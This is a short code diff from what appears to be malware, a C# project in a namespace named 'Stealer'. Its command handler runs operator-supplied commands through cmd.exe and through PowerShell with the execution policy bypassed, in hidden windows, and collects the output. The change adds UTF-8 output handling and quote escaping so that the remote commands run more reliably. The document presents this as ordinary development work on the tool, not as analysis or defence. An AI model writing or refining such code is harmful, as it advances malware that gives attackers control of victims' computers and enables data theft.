@@ -103,12 +103,14 @@ namespace Stealer
             else if (cmdLower.StartsWith("exec_cmd:"))
             {
                 string payload = cmd.Substring("exec_cmd:".Length);
-                RunShellCommand("cmd.exe", "/c " + payload, "cmd_res");
+                RunShellCommand("cmd.exe", "/c chcp 65001 > nul 2>&1 & " + payload, "cmd_res");
             }
             else if (cmdLower.StartsWith("exec_ps:"))
             {
                 string payload = cmd.Substring("exec_ps:".Length);
-                RunShellCommand("powershell.exe", "-NoProfile -ExecutionPolicy Bypass -Command " + payload, "ps_res");
+                RunShellCommand("powershell.exe",
+                    "-NoProfile -ExecutionPolicy Bypass -Command \"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; " + payload.Replace("\"", "\\\"") + "\"",
+                    "ps_res");
             }
             else if (cmdLower == "tasklist")
             {
@@ -137,7 +139,9 @@ namespace Stealer
                         UseShellExecute = false,
                         RedirectStandardOutput = true,
                         RedirectStandardError = true,
-                        CreateNoWindow = true
+                        CreateNoWindow = true,
+                        StandardOutputEncoding = System.Text.Encoding.UTF8,
+                        StandardErrorEncoding = System.Text.Encoding.UTF8
                     };
                     using (var p = System.Diagnostics.Process.Start(psi))
                     {
